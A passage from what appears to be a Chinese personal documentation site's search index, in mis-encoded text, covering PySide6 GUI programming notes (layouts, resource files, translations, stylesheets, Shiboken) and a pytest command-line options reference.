'speak' signal with different arguments. # we have to specify the str as int is the default someone.speak.emit(10) someone.speak[str].emit(\"Hello everybody!\") æ§ä»¶å¸ƒå±€ å¸ƒå±€ ç›¸å…³æ§ä»¶: QHBoxLayout, æ°´å¹³å¸ƒå±€(ä»å·¦åˆ°å³) QVBoxLayout, å‚ç›´å¸ƒå±€(ä»ä¸Šåˆ°ä¸‹) QGridLayout, æ ¼å­å¸ƒå±€ QFormLayout, åªæœ‰ä¸¤åˆ—çš„æ ¼å­å¸ƒå±€ è®¾ç½®ä¸€ä¸ªæ°´å¹³å¸ƒå±€: self._layout = QHBoxLayout(self) å¸ƒå±€å†…åŠ å…¥ä¸¤ä¸ªæ§ä»¶, æ§ä»¶æ°´å¹³æ–¹å‘å æ¯”ä¸º 1:4 self._layout.addWidget(self._m_left_side_window, 1) self._layout.addWidget(self._m_main_window, 4) ä¸ä»¥ä¸‹ä»£ç æ•ˆæœä¸€è‡´: self._layout.addWidget(self._m_left_side_window, ) self._layout.addWidget(self._m_main_window, ) self._layout.setStretchFactor(self._m_left_side_window, 1) self._layout.setStretchFactor(self._m_main_window, 4) æœ‰æ—¶æœ‰è®¾ç½®æ§ä»¶å¸ƒå±€çš„éœ€æ±‚: # xx_widget.setLayout(self._layout) self.setLayout(self._layout) ä½¿ç”¨ ``resize(width, heigth)`` ä¸ ä½¿ç”¨å¸ƒå±€æ§ä»¶å¦‚ ``QVBoxLayout`` å‚ç›´å¸ƒå±€æ˜¯å†²çªçš„ resize(width, heigth) è¡¨ç¤ºè‡ªå®šä¹‰çª—ä½“å¤§å°, è¿™ä¸ªæ—¶å€™æ˜¯éœ€è¦è‡ªå·±è¿›è¡Œæ‰‹åŠ¨å¸ƒå±€çš„, ä¸”éœ€è¦æ‰‹åŠ¨æ‰§è¡Œ show() æ‰å¯ä»¥æ˜¾ç¤ºæ§ä»¶ ä½¿ç”¨å¸ƒå±€æ§ä»¶, å¸ƒå±€æ§ä»¶ä¼šè‡ªåŠ¨å¸®ä½ è°ƒæ•´å…¶å†…å®¹å¤§å°, åªæœ‰æœ€é¡¶å±‚çš„éœ€è¦è°ƒç”¨ show() , éœ€è¦æ³¨æ„çš„æ˜¯, å…¶ä¸‹å¦‚æœæœ‰æ§ä»¶æ²¡æ”¾åˆ°å¸ƒå±€å†…éƒ¨, è¿˜æ˜¯éœ€è¦æ‰‹åŠ¨ show addStretch(), å¡«å……ä¸€ä¸ªç©ºç™½ä½ç½® æ˜¾ç¤ºè¡¨æ ¼æ•°æ®çš„ä¸¤ä¸ªæ§ä»¶ QTableWidget æ­é… QTableWidgetItem(è¡¨ç¤ºæ¯ä¸€ä¸ªå•å…ƒæ ¼) ä½¿ç”¨, ç®€å•ä¸€ç‚¹, ä½†æ˜¯å¤§æ•°æ®æ—¶å€™ä¸å¡ QTableView å¤æ‚ä¸€ç‚¹, å¤§æ•°æ®æµç•… QTableWidget éƒ¨åˆ†æ–¹æ³•: setHorizontalHeaderLabels è®¾ç½®è¡¨æ ¼å¤´, å‚æ•°ä¸º stræˆ–è€…listç±»å‹ å±•ç¤º/æ›´æ–°é¢œè‰²æ§ä»¶ QColor ä¸€äº›åŸºæœ¬é¢œè‰²ä¸å¯¹åº”16è¿›åˆ¶: colors = [(\"Red\", \"#FF0000\"), (\"Green\", \"#00FF00\"), (\"Blue\", \"#0000FF\"), (\"Black\", \"#000000\"), (\"White\", \"#FFFFFF\"), (\"Electric Green\", \"#41CD52\"), (\"Dark Blue\", \"#222840\"), (\"Yellow\", \"#F9E56d\")] æ ‘æ§ä»¶ QTreeWidget, ä¸ QTreeWidgetItem åä½œ QTreeView å›¾è¡¨æ§ä»¶ QPieSeries, é¥¼çŠ¶å›¾ QLineSeries, æŠ˜çº¿å›¾ QChart QChartView å¯å‚è€ƒä¾‹å­: Expenses Tool Tutorial å¼‚æ­¥ç¼–ç¨‹ trio æ¨¡å— ui æ–‡ä»¶é…ç½® æ„Ÿè§‰æ²¡æœ‰æ‰‹å†™æ–¹ä¾¿, å…ˆç•¥è¿‡ qrc æ–‡ä»¶é…ç½® .qrc æ˜¯ç”¨æ¥é…ç½®äºŒè¿›åˆ¶èµ„æºæ–‡ä»¶çš„, é€šè¿‡æ­¤æ–‡ä»¶åŠ è½½å“åº”çš„èµ„æºæ–‡ä»¶å¦‚å­—ä½“, å›¾æ ‡, ç„¶åä½¿ç”¨ æ§ä»¶ å¦‚: QFile, QIcon ä¸€ä¸ªå›¾æ ‡qrcæ–‡ä»¶ icons.qrc: </ui> <!DOCTYPE RCC><RCC version=\"1.0\"> <qresource> <file>icons/play.png</file> <file>icons/pause.png</file> <file>icons/stop.png</file> <file>icons/previous.png</file> <file>icons/forward.png</file> </qresource> </RCC> ä½¿ç”¨ pyside6-rcc è½¬æ¢ä¸º Python æ–‡ä»¶: pyside6-rcc icons.rc -o rc_icons.py åŸæ¥ä»£ç : from PySide6.QtGui import QIcon, QKeySequence playIcon = self.style().standardIcon(QStyle.SP_MediaPlay) ä¿®æ”¹åçš„ä»£ç : from PySide6.QtGui import QIcon, QKeySequence, QPixmap playIcon = QIcon(QPixmap(\":/icons/play.png\")) å¤šè¯­è¨€æ”¯æŒ Qt Linguist å®˜ç½‘ç§°åš: Qt Linguist è§: translations ä½¿ç”¨ self.tr() count = len(self._list_widget.selectionModel().selectedRows()) message = self.tr(\"%n language(s) selected\", \"\", count) ç¿»è¯‘æ–‡ä»¶ä¸ºåŸºäº XML çš„ .ts æ–‡ä»¶, é€šè¿‡ lupdate æå–: pyside6-lupdate main.py main.qml form.ui -ts example_de.ts æ–‡ä»¶å·²å­˜åœ¨åˆ™ä¸ºæ›´æ–°æ¨¡å¼. è½¬æ¢ä¸ºäºŒè¿›åˆ¶çš„ .qm æ–‡ä»¶: mkdir translations pyside6-lrelease example_de.ts -qm translations/example_de.qm å»ºè®®é€šè¿‡ .qrc æ–‡ä»¶æ¥ä½¿ç”¨: <!DOCTYPE RCC><RCC version=\"1.0\"> <qresource> <file>translations/example_de.qm</file> </qresource> </RCC> ä»£ç ä¸­è·¯å¾„å½¢å¼: :/translations/example_de.qm ä»£ç ä¸­é€šè¿‡ QTranslator æ¥åŠ è½½: path = QLibraryInfo.location(QLibraryInfo.TranslationsPath) translator = QTranslator(app) if translator.load(QLocale.system(), 'qtbase', '_', path): app.installTranslator(translator) translator = QTranslator(app) path = ':/translations' if translator.load(QLocale.system(), 'example', '_', path): app.installTranslator(translator) ç¬¬ä¸€æ¬¡åŠ è½½ Qt çš„ç¿»è¯‘, ç¬¬äºŒæ¬¡åŠ è½½èµ„æºæ–‡ä»¶çš„ç¿»è¯‘. å¯é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿è¡Œ: LANG=de python main.py GNU gettext ç›¸å…³å¯å‚è€ƒ /docs/åç«¯/python/pythonæ ‡å‡†åº“/gettext ä¾‹å­, æœ€é¡¶éƒ¨å®šä¹‰ import gettext ... _ = None ngettext = None ç¿»è¯‘éƒ¨åˆ†å®šä¹‰ src_dir = Path(__file__).resolve().parent try: translation = gettext.translation('example', localedir=src_dir / 'locales') if translation: translation.install() _ = translation.gettext ngettext = translation.ngettext except FileNotFoundError: pass if not _: _ = gettext.gettext ngettext = gettext.ngettext å°†ä¼šæ‰¾ locales ä¸‹çš„ example ä½¿ç”¨ file_menu = self.menuBar().addMenu(_(\"&File\")) è½¬æ¢ .pot æ–‡ä»¶: mkdir -p locales/de_DE/LC_MESSAGES xgettext -L Python -o locales/example.pot main.py æ–‡ä»¶å¤´å¤§æ¦‚å¦‚ä¸‹: \"Project-Id-Version: PySide6 gettext example\\n\" \"POT-Creation-Date: 2021-07-05 14:16+0200\\n\" \"Language: de_DE\\n\" \"MIME-Version: 1.0\\n\" \"Content-Type: text/plain; charset=UTF-8\\n\" \"Content-Transfer-Encoding: 8bit\\n\" \"Plural-Forms: nplurals=2; plural=n != 1;\\n\" ç¿»è¯‘å†…å®¹å¤§æ¦‚å¦‚ä¸‹: #: main.py:57 msgid \"&File\" msgstr \"&Datei\" è½¬æ¢ä¸º .mo ç¿»è¯‘æ–‡ä»¶: msgfmt -o example.mo example.pot è¿è¡Œ: LANG=de python main.py æ§ä»¶æ ·å¼ é»˜è®¤ä½¿ç”¨å½“å‰å¹³å°ç³»ç»Ÿçš„ä¸»é¢˜. ä¹Ÿå¯è‡ªå®šä¹‰æ ·å¼ è‡ªå®šä¹‰æ–¹å¼: ä½¿ç”¨ Qt æä¾›çš„éƒ¨åˆ†æ ·å¼, å¦‚: w = QLabel(\"This is a placeholder text\") w.setAlignment(Qt.AlignCenter) ç±» CSS è¯­æ³•, å¦‚: w.setStyleSheet(\"\"\" background-color: #262626; color: #FFFFFF; font-family: Titillium; font-size: 18px; \"\"\") å¤šä¸ªç±» CSS æ ·å¼å¯ä»¥ä½¿ç”¨ .qss æ–‡ä»¶ æ³¨è§£ ä½¿ç”¨å­—ä½“éœ€è¦å…ˆå®‰è£…. å¯ä»¥ä½¿ç”¨ QFontDatabase æŸ¥çœ‹å·²å®‰è£…å­—ä½“, ä½¿ç”¨ families() æŒ‡å®š. .qss æ–‡ä»¶è¯´æ˜: ä¸ CSS æ–‡ä»¶åŸºæœ¬æ˜¯ä¸€è‡´çš„, ä¸è¿‡å¯ä»¥ç›´æ¥ä½¿ç”¨æ§ä»¶ç±»åæ¥æŒ‡å®šæ ·å¼: QLabel { background-color: red; } ä¹Ÿå¯ä»¥è®¾ç½®æ§ä»¶ç±»å¯¹è±¡çš„åç§°, å¦‚: QLabel#title { font-size: 20px; } è€Œå¯¹äºæŸäº›é¢„å®šä¹‰æ§ä»¶ä¸‹çš„æ§ä»¶, å¦‚ QListWidget ä¸‹çš„ QListWidgetItem QListWidget::item { height: 50px; } åŒæ ·çš„, é€‰ä¸­çŠ¶æ€å®šä¹‰: QListWidget::item:selected { background-color: #2ABf9E; qproperty-alignment: AlignCenter; } ä»£ç ä¸­è¿™æ ·å®šä¹‰: label = QLabel(\"Test\") label.setObjectName(\"title\") ä½¿ç”¨è‡ªå®šä¹‰çš„æ ·å¼æ–‡ä»¶, ä½¿ç”¨ setStyleSheet if __name__ == \"__main__\": app = QApplication() w = Widget() w.show() with open(\"style.qss\", \"r\") as f: _style = f.read() app.setStyleSheet(_style) sys.exit(app.exec()) è¿™æ ·è®¾è®¡å¯ä»¥å¾ˆå¥½çš„å» è§£è€¦ ç§»æ¤ C++ åº”ç”¨åˆ° Python Qt ç§° é‡å†™ æ›´è´´åˆ‡. å‚è€ƒ: Porting a C++ Application to Python","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Tutorial.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-Tutorial.html"},{"title":"Pyside6","text":"QML Qtæ”¯æŒçš„æ¨¡å— debianä¸‹çš„å®‰è£… æ•™ç¨‹ ä½¿ç”¨dockerå®‰è£… é¡¹ç›®ä»‹ç» æ•°æ®å¯è§†åŒ–å·¥å…· åŸºæœ¬æ¦‚å¿µè¯´æ˜ Qt, QML, WidgetsåŒºåˆ« å‚è€ƒ:: Qt, QML, Widgetsâ€¦What Is The Difference? Qt å¯ä»¥æ˜¯ä½¿ç”¨ C++ å¼€å‘çš„ Qt æ¡†æ¶, ä¹Ÿå¯ä»¥æ˜¯ ä½¿ç”¨æ­¤æ¡†æ¶å¼€å‘çš„ Qt åº”ç”¨ç¨‹åº. QML Qtè®¾è®¡çš„ä¸€ç§ç±»ä¼¼ CSS, JSON çš„è¯­è¨€, åŒæ—¶å…è®¸ JavaScript , ç”¨äºåˆ›å»º UI åº”ç”¨ å¯è¢«å…¶ä»–ç»„ä»¶é›†æˆ, å¯è¢« C++ ä»£ç ä½¿ç”¨. Widgets é¢„å®šä¹‰çš„ä¸€äº› Qt æ§ä»¶, æ§ä»¶åŸåˆ™æ˜¯: åŸºæœ¬ä¸ç³»ç»ŸåŸç”Ÿçª—å£å¤–è§‚ä¸€è‡´. å¦‚æœéœ€è¦æ›´æ–°å¤–è§‚æ ·å¼(å¯èƒ½ä¼šè¿èƒŒä¸Šé¢çš„åŸåˆ™), å‚è€ƒ... æ²¡å‚è€ƒäº†, å®˜ç½‘æ–‡æ¡£éƒ½ 404 äº†... Python And C++ ä½¿ç”¨ Python å¼€å‘æ—¶, ä¸éœ€è¦äº†è§£ C++ çš„å®ç°. ä¸è¿‡å¯ä»¥æ··åˆä½¿ç”¨. åœ¨ç”¨æˆ·ä»£ç çº§åˆ«, Python å®ç°åŸºæœ¬åšåˆ°äº†å…¨è¦†ç›–(C++ çš„å®ç°), å¯ä»¥ä»»æ„é‡å†™ è‹¥ä½¿ç”¨ C++ è‡ªå®šä¹‰æ§ä»¶, å¯ä»¥åˆ›å»º Python ç»‘å®šä»¥ä¾¿äºåœ¨ Python ä½¿ç”¨ è‹¥æœ‰ç‰¹æ®Šçš„éœ€æ±‚å®ç°éœ€è¦ä½¿ç”¨åˆ°è‡ªå®šä¹‰çš„ C++ åº“, ä¹Ÿå¯ä»¥åˆ›å»ºå…¶ç»‘å®šä»¥ä¾¿ Python ä½¿ç”¨ å¯¹äºä¸€ä¸ª C++ çš„ Qt ç¨‹åºè€Œè¨€, å¯ä»¥é€šè¿‡æš´éœ²å•ä¾‹çš„ Python ç»‘å®š ç»™ Python è§£é‡Šå™¨ä»¥ä¾¿å…¶ä½¿ç”¨ (å°±åƒä¸€ä¸ª Python æ’ä»¶ç³»ç»Ÿ) ä¸è¿‡è¿™äº›å®ç°(åé¢ä¸‰ä¸ªå®ç°), ä¾èµ–äº Shiboken (ç»‘å®šç”Ÿæˆå·¥å…·) æ–‡ä»¶ç±»å‹ å®˜ç½‘:: File Types .ui , ç±»ä¼¼ XML æ–‡ä»¶çš„å½¢å¼æ¥ç»˜åˆ¶ GUI ç•Œé¢, ä½¿ç”¨ pyside6-uic å°†å…¶è½¬æ¢ä¸º Python ä»£ç . ç¼–å†™å‚è€ƒ: using-ui-files .qrc , èµ„æºæ–‡ä»¶, ç¼–å†™æ–¹å¼ç±»ä¼¼ XML, ä½¿ç”¨ pyside6-rcc å°†å…¶è½¬æ¢ä¸º Python ä»£ç . ç¼–å†™å‚è€ƒ: using-qrc-files .qml , è¯­è¨€æ–‡ä»¶, ç»˜åˆ¶é¡µé¢. .pyproject , æ–°ç‰ˆæœ¬å†…å®¹æ˜¯åŸºäº JSON çš„æ ¼å¼. å¯ç”¨äºé…ç½®ç»™ C++ é¡¹ç›®å¤„ç†çš„ä¸€äº›æ–‡ä»¶. ä¸€äº›å‘½ä»¤è¡Œ å‚è€ƒ:: Which IDEs Are Compatible? æ‰“å¼€ Qt Designer å·¥å…·ä»¥åˆ›å»º .ui æ–‡ä»¶: pyside6-designer å°† .ui æ–‡ä»¶è½¬æ¢ä¸º Python ä»£ç : pyside6-uic -i form.ui -o ui_form.py å°† .qrc æ–‡ä»¶è½¬æ¢ä¸º Python ä»£ç : pyside6-rcc -i resources.qrc -o rc_resources.py å¯ä½¿ç”¨çš„å¼€å‘å·¥å…·(IDE) QtCreator, æœ‰ä¸ªå¥½å¤„æ˜¯æœ‰ä¸€äº›æ¨¡ç‰ˆå¯ä»¥ä½¿ç”¨, ä¸‹è½½: QtCreator (è¿™ä¸ªè¿˜çœŸæ²¡å¬è¯´è¿‡, æœ‰ç©ºäº†è§£ä¸€ä¸‹) Visual Studio Code, éœ€è¦å®‰è£…æ’ä»¶: ext install seanwu.vscode-qt-for-python PyCharm, éœ€æ‰‹åŠ¨é…ç½®ç›¸å…³å·¥å…·. å¦‚ Qt Designer . é…ç½®ä½ç½®: File > Settings > tools > PyCharm External Tools Shiboken - ç»‘å®šç”Ÿæˆå™¨(Python/C++) ä¸‹åŒ…å«å‡½æ•°: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pyside6_more/modules/Shiboken pip å®‰è£…çš„æ—¶å€™, é»˜è®¤ä¼šä¸€èµ·å®‰è£…çš„æ¨¡å—: yanque@yanquedembp code % pip list | grep shiboken shiboken6 6.4.0.1 åŒ…å«äº†ä¸€äº›å·¥å…·æ¥ä¿è¯ Pyside å¯ä»¥æ­£ç¡®è¿è¡Œ (ä¸»ç”¨äºdebugå§) è¿˜æœ‰ä¸€ä¸ª Shiboken Generator é»˜è®¤ä¸ä¼šè‡ªåŠ¨ä¸€èµ·å®‰è£…. æ•™ç¨‹ä¸­æåˆ°çš„ Shiboken å¤§å¤šæŒ‡çš„æ˜¯ Shiboken Generator , è¯¦è§: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/pyside6_more/modules/Shiboken Generator ä»€ä¹ˆæ—¶å€™éœ€è¦ Shiboken Generator ? è‹¥ä»…è¿è¡Œä¸€ä¸ª Python çº§åˆ«çš„ Qt åº”ç”¨, åˆ™ä¸éœ€è¦ è‹¥éœ€è¦äº C++ å±‚é¢çš„ä»£ç ç»“åˆ, å¦‚ç»§æ‰¿æˆ–è‡ªå®šå®ç°çš„ C++ çš„ç»‘å®š, éœ€è¦ é¡¹ç›®éƒ¨ç½² å®˜ç½‘:: distribution deployment å°¤å…¶æ˜¯è·¨å¹³å°æ—¶. å®˜æ–¹å»ºè®®æ˜¯æ„å»ºå†»ç»“æ–‡ä»¶, å…¶å®å°±æ˜¯å°†ä»£ç æ‰“åŒ…æˆå¹³å°çš„ç›¸åº”åŒ…, ä¸åŒçš„æ¨¡å—å¯ä»¥æ‰“åŒ…æˆä¸åŒçš„åŒ…ä»¥é€‚é…å¤§å‹åº”ç”¨, å› ä¸ºè¿™æ ·å¯ä»¥åˆ†å¸ƒå¼çš„æ›´æ–°ä»…éœ€æ›´æ–°çš„æ–‡ä»¶. ä¸ªäººæ¯”è¾ƒç†Ÿæ‚‰çš„æ˜¯: deployment-nuitka","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-index.html"},{"title":"æ”¯æŒçš„æ¨¡å—","text":"Shiboken Generator Shiboken","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-index.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pyside6_more-modules-index.html"},{"title":"pytest","text":"ä½¿ç”¨è§: /docs/åç«¯/python/æ•™ç¨‹/Pytest è¯­æ³•: pytest [options] [file_or_dir] [file_or_dir] [...] # positional arguments: # file_or_dir é€‰é¡¹å‚æ•° general: --capture= method æ•è·æ¶ˆæ¯çš„ç±»å‹ fd|sys|no|tee-sys. -s ä¸Šé¢ä¸ºnoæ—¶çš„ç®€å†™ --capture=no. åé¢çœ‹åˆ°ä¸€ä¸ªè¯´æ³•æ˜¯è¾“å‡ºåŒ…å«stdoutä¸stderr. æ­£å¸¸æƒ…å†µä¸‹,pytestä¼šæ•è·æµ‹è¯•ä¸­çš„stdoutå’Œstderr,å¹¶åªåœ¨æµ‹è¯•å¤±è´¥æ—¶æ‰å°†å…¶æ‰“å°å‡ºæ¥ã€‚ ä½¿ç”¨-sé€‰é¡¹å,pytestå°†ä¸ä¼šæ•è·stdoutå’Œstderr,è€Œæ˜¯ç›´æ¥æ‰“å°ã€‚ è¿™åœ¨è°ƒè¯•æµ‹è¯•ç”¨ä¾‹æ—¶éå¸¸æœ‰ç”¨,å¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°çœ‹åˆ°printçš„è¾“å‡º,è€Œä¸éœ€è¦æ·»åŠ å¤±è´¥çš„æ–­è¨€æ¥æŸ¥çœ‹è¾“å‡ºã€‚ --show-capture= <{no,stdout,stderr,log,all}> Controls how captured stdout/stderr/log is shown on Write captured log messages to JUnit report: one of -m <some_test> æŒ‡å®šè¦è¿è¡Œå“ªäº›æµ‹è¯• -m MARKEXPR ä»…è¿è¡Œ @pytest.mark.MARKEXPR è£…é¥°çš„æµ‹è¯•. å¦‚: -m 'mark1 and not mark2'. -k EXPRESSION ä»…æ‰§è¡ŒåŒ¹é… EXPRESSION çš„æµ‹è¯•, æ”¯æŒé€šé…ç¬¦, å¤šä¸ªä½¿ç”¨å¼•å·åŒ…è£¹, or éš”å¼€. å¦‚: -k 'test_method or test_other' è¡¨ç¤º ä¼šæ‰§è¡Œæ‰€æœ‰ å‡½æ•°å/ç±»ååŒ…å« 'test_method' or 'test_other' çš„æµ‹è¯•; -k 'not test_method' è¡¨ç¤ºä»…æ‰§è¡Œä¸åŒ…å« 'test_method' çš„æµ‹è¯•; -k 'not test_method and not test_other' è¡¨ç¤ºä¸¤è€…ä¹‹ä¸€è¢«åŒ…å«çš„æµ‹è¯•ä¼šè¢«æ’é™¤. --markers show markers, å³ä¸Šé¢ -m çš„ MARKEXPR -x , --exitfirst å½“æµ‹è¯•é”™è¯¯/æ‰§è¡Œå¤±è´¥, ç«‹å³é€€å‡ºæ‰§è¡Œ, ä¸ä¼šè¿è¡Œåé¢çš„æµ‹è¯• --fixtures , --funcargs show available fixtures, sorted by plugin appearance (fixtures with leading '_' are only shown with '-v') --fixtures-per-test show fixtures per test --pdb åœ¨é”™è¯¯æˆ–è€…é”®ç›˜ä¸­æ–­(Ctrl + C)æ—¶å€™, å¼€å§‹ä¸€ä¸ªäº¤äº’å¼çš„ pdb debugger (ç»ˆç«¯). --pdbcls= <modulename:classname> ä½¿ç”¨ --pdb æ¥å¼€å¯ä¸€ä¸ª debug ç»ˆç«¯. æ­¤æ—¶å¯åŠ æ­¤é€‰é¡¹æ¥æŒ‡å®šç»ˆç«¯ç±»å‹, å¦‚: --pdbcls=IPython.terminal.debugger:TerminalPdb --trace åœ¨è¿è¡Œæ¯é¡¹æµ‹è¯•æ—¶ç«‹å³ä¸­æ–­, ç”¨äº debug. --runxfail æŠ¥å‘Šæ ‡è®° XFAIL æµ‹è¯•çš„ç»“æœ, å°±åƒä»–ä»¬æ²¡æœ‰è¢«æ ‡è®°ä¸€æ ·. --lf , --last-failed åœ¨æœ€åä¸€æ¬¡è¿è¡Œæ—¶, ä»…é‡æ–°è¿è¡Œå¤±è´¥çš„æµ‹è¯•(å¦‚æœæ²¡æœ‰å¤±è´¥ï¼Œåˆ™å…¨éƒ¨è¿è¡Œ) --ff , --failed-first è¿è¡Œæ‰€æœ‰æµ‹è¯•ï¼Œä½†å…ˆè¿è¡Œæœ€åçš„å¤±è´¥ã€‚ è¿™å¯èƒ½ä¼šé‡æ–°å®‰æ’æµ‹è¯•ï¼Œä»è€Œå¯¼è‡´ å›ºä»¶çš„é‡å¤ å®‰è£…/å¸è½½. --nf , --new-first é¦–å…ˆè¿è¡Œæœ€æ–°çš„æ–‡ä»¶çš„æµ‹è¯•, ç„¶åæŒ‰ç…§æ–‡ä»¶çš„ mtime (ä¿®æ”¹æ—¶é—´) é¡ºåºæ‰§è¡Œ. --cache-show= <[CACHESHOW]> ä¸æ‰§è¡Œæµ‹è¯•æ”¶é›†/æµ‹è¯•, æ˜¾ç¤ºç¼“å­˜å†…å®¹. Optional argument: glob (default: '*'). --cache-clear æµ‹è¯•å¼€å§‹å‰ç§»é™¤æ‰€æœ‰çš„ç¼“å­˜å†…å®¹. --lfnf= <{all,none}> , --last-failed-no-failures= <{all,none}> åœ¨ä¹‹å‰æ²¡æœ‰ï¼ˆå·²çŸ¥ï¼‰æ•…éšœçš„æƒ…å†µä¸‹è¿è¡Œå“ªäº›æµ‹è¯•? åŸå¥: which tests to run with no previously (known) failures. --sw , --stepwise å½“æµ‹è¯•å¤±è´¥æ—¶é€€å‡º, ä¸‹ä¸€æ¬¡ä»æ¬¡å¤±è´¥çš„æµ‹è¯•å¼€å§‹æ‰§è¡Œ --sw-skip , --stepwise-skip ä»…å¿½ç•¥ç¬¬ä¸€ä¸ªå¤±è´¥çš„æµ‹è¯•, å³åç»­è¿˜æœ‰å¤±è´¥ä¼šåœæ­¢ éšå¼å¯ç”¨ --stepwise. -v å¯ç”¨å†—é•¿æ—¥å¿—è®°å½•,ä¼šæ‰“å°æ›´è¯¦ç»†çš„æµ‹è¯•ç»“æœã€‚ -v v å¯ç”¨æ›´åŠ è¯¦ç»†çš„æ—¥å¿—,ä¼šæ‰“å°æµ‹è¯•ç›¸å…³çš„æ‰€æœ‰è¾“å‡º,åŒ…æ‹¬: æµ‹è¯•å¼€å§‹å’Œç»“æŸçš„æ—¥å¿—; æµ‹è¯•æ–‡ä»¶è·¯å¾„; é€šè¿‡çš„æµ‹è¯•ç”¨ä¾‹åç§°; å¤±è´¥çš„æµ‹è¯•ç”¨ä¾‹åç§°åŠå¤±è´¥åŸå› ; è·³è¿‡çš„æµ‹è¯•ç”¨ä¾‹åç§°åŠè·³è¿‡åŸå› ; æ‰€æœ‰æ‰“å°çš„è¾“å‡º(ç±»ä¼¼-sé€‰é¡¹); ç”¨äºè®°å½•æµ‹è¯•ç»“æœçš„æ–‡ä»¶è·¯å¾„; ``-m MARKEXPR`` è¯´æ˜ : ä½œç”¨ä¸ºæŒ‡å®šè¿è¡Œå“ªäº›æµ‹è¯•ç”¨ä¾‹, MARKEXPR è¡¨ç¤ºè£…é¥°å™¨çš„æ ‡è®°, å¤šä¸ªä½¿ç”¨å¼•å·åŒ…è£¹, or éš”å¼€: pytest -m \"test_run1 or test_run2 or test_run3\" è¡¨ç¤ºä»…è¿è¡Œä»¥ä¸‹è£…é¥°å™¨ä¿®é¥°çš„æµ‹è¯•: @pytest.mark.test_run1 @pytest.mark.test_run2 @pytest.mark.test_run3 æ•è·æ–¹å¼ capture è¯´æ˜ : fd, æ–‡ä»¶æè¿°ç¬¦çº§åˆ«çš„æ•è·, ä¹Ÿå°±æ˜¯å†™å…¥åˆ° 1 , 2 æ ‡å‡†è¾“å‡º/é”™è¯¯çš„å†…å®¹ä¼šè¢«æ•è· sys, ä½¿ç”¨ sys.stdout , sys.stderr è¾“å‡ºçš„æ¶ˆæ¯ä¼šè¢«æ•è· no, ç¦æ­¢æ•è·æ‰€æœ‰è¾“å‡º. tee-sys ä¸ªäººç†è§£: è¿™é‡Œçš„æ•è·, å³å°†æœ¬æ¥åº”è¯¥ç«‹å³è¾“å‡ºåˆ°åˆ°æ§åˆ¶å°/æ–‡ä»¶çš„ä¿¡æ¯æˆªå–, å¯ä»¥åŠ ä¸€äº›è‡ªå®šä¹‰çš„æ“ä½œ. é»˜è®¤æ˜¯ all , æ•è·æ‰€æœ‰ä¿¡æ¯, æ‰€ä»¥ä¸ä¼šå®æ—¶è¾“å‡ºè€Œæ˜¯ç»“æŸåä¸€èµ·è¾“å‡º å¦‚æœæƒ³ å®æ—¶è¾“å‡ºä¿¡æ¯ é‚£ä¹ˆéœ€è¦ä½¿ç”¨, -s æˆ–è€… --capture=no , å®é™…æµ‹è¯•ä¹Ÿä¸æ˜¯å¿…é¡» æ—¥å¿—é€‰é¡¹ å¯ä»¥ pytest -h æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£, logging ç›¸å…³éƒ¨åˆ†å†…å®¹å¦‚ä¸‹: logging: --log-level=LEVEL level of messages to catch/display. Not set by default, so it depends on the root/parent log handler's effective level, where it is \"WARNING\" by default. --log-format=LOG_FORMAT log format as used by the logging module. --log-date-format=LOG_DATE_FORMAT log date format as used by the logging module. --log-cli-level=LOG_CLI_LEVEL cli logging level. --log-cli-format=LOG_CLI_FORMAT log format as used by the logging module. --log-cli-date-format=LOG_CLI_DATE_FORMAT log date format as used by the logging module. --log-file=LOG_FILE path to a file when logging will be written to. --log-file-level=LOG_FILE_LEVEL log file logging level. --log-file-format=LOG_FILE_FORMAT log format as used by the logging module. --log-file-date-format=LOG_FILE_DATE_FORMAT log date format as used by the logging module. --log-auto-indent=LOG_AUTO_INDENT Auto-indent multiline messages passed to the logging module. Accepts true|on, false|off or an integer. æœ‰ä¸‰ç§ä½¿ç”¨æ–¹å¼: A: pytest test_xxx.py --log-cli-level=info B, ç¼–è¾‘pytest.iniæˆ–tox.iniæˆ–setup.cfgæ–‡ä»¶: [pytest] log_cli = 1 log_cli_level = INFO log_cli_format = %(asctime)s [%(levelname)8s] %(message)s (%(filename)s:%(lineno)s) log_cli_date_format=%Y-%m-%d %H:%M:%S C, ç”¨pytest -oæ–¹å¼é‡å†™(pytest 3.4ä¹‹å): pytest test_xxx.py -o log_cli=true -o log_cli_level=INF è­¦å‘Šç›¸å…³: pytest-warnings: -W PYTHONWARNINGS, --pythonwarnings=PYTHONWARNINGS Set which warnings to report, see -W option of Python itself --maxfail=num Exit after first num failures or errors --strict-config Any warnings encountered while parsing the `pytest` section of the configuration file raise errors --strict-markers Markers not registered in the `markers` section of the configuration file raise errors --strict (Deprecated) alias to --strict-markers -c file Load configuration from `file` instead of trying to locate one of the implicit configuration files --continue-on-collection-errors Force test execution even if collection errors occur --rootdir=ROOTDIR Define root directory for tests. Can be relative path: 'root_dir', './root_dir', 'root_dir/another_dir/'; absolute path: '/home/user/root_dir'; path with variables: '$HOME/root_dir'. ä½¿ç”¨pytest.iniæ–‡ä»¶ ä½¿ç”¨ pytest.ini æ–‡ä»¶é…ç½®æµ‹è¯•ç”¨ä¾‹ æ–‡ä»¶ä¸€èˆ¬å»ºç«‹åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹. ä¹Ÿä¸æ˜¯å¼ºåˆ¶æ€§, åœ¨å“ªä¸ªç›®å½•ä¸‹æ‰§è¡Œ pytest å‘½ä»¤, å°±åœ¨å“ªä¸ªç›®å½•ä¸‹å¯»æ‰¾ pytest.ini , ä¸æ”¯æŒæ”¾åœ¨å­ç›®å½•ä¸‹(é™¤éå»å­ç›®å½•è·‘æµ‹è¯•) ä¸€èˆ¬é…ç½®æ¨¡ç‰ˆ: [pytest] # ç„¶åå†™é…ç½®é¡¹ æ”¯æŒçš„é…ç½®é€‰é¡¹(éƒ¨åˆ†): 